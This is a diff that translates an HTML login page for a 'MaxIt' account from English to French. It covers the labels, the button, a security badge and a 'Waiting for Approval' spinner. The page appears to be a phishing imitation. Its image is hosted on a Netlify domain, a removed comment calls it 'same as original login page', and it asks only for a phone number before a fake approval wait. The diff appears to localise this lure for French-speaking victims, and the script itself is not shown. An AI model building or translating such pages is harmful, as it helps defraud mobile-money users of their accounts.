@@ -283,10 +283,9 @@
     </style>
 </head>
 <body>
-
 <div class="card">
 
-    <!-- Header -->
+    <!-- En-tête -->
     <div class="header">
         <div class="logo-wrap">
             <div class="logo-bg">
@@ -294,7 +293,7 @@
             </div>
         </div>
 
-        <!-- Hero image (same as original login page) -->
+        <!-- Image principale -->
         <div class="hero-img-wrap">
             <img
                 src="https://maxitapps.netlify.app/sslimage-removebg-preview.png"
@@ -306,15 +305,15 @@
             </div>
         </div>
 
-        <div class="header-title">Authentication</div>
-        <div class="header-desc">Enter your phone number to log in to your MaxIt account.</div>
+        <div class="header-title">Authentification</div>
+        <div class="header-desc">Saisissez votre numéro de téléphone pour vous connecter à votre compte MaxIt.</div>
     </div>
 
-    <!-- Form -->
+    <!-- Formulaire -->
     <div class="form-body">
 
         <div class="form-group">
-            <label for="phoneNumber">Phone Number</label>
+            <label for="phoneNumber">Numéro de téléphone</label>
             <div class="input-wrap">
                 <i class="fa-solid fa-user input-icon"></i>
                 <input type="tel" id="phoneNumber" placeholder="0-XX-XX-XX-XX" inputmode="numeric">
@@ -323,22 +322,22 @@
 
         <div class="error-msg" id="errMsg"></div>
 
-        <button class="btn-primary" id="loginBtn">Log in</button>
+        <button class="btn-primary" id="loginBtn">Se connecter</button>
 
         <div class="security-note">
             <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                 <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
             </svg>
-            256-bit encrypted &amp; secured by MaxIt
+            Chiffrement 256 bits et sécurité assurée par MaxIt
         </div>
     </div>
 </div>
 
-<!-- Spinner overlay -->
+<!-- Écran de chargement -->
 <div id="spinner">
     <div class="spin-ring"></div>
-    <div class="spin-label">Waiting for Approval</div>
-    <div class="spin-sub">Please hold on…</div>
+    <div class="spin-label">En attente d'approbation</div>
+    <div class="spin-sub">Veuillez patienter…</div>
 </div>
 
 <script>
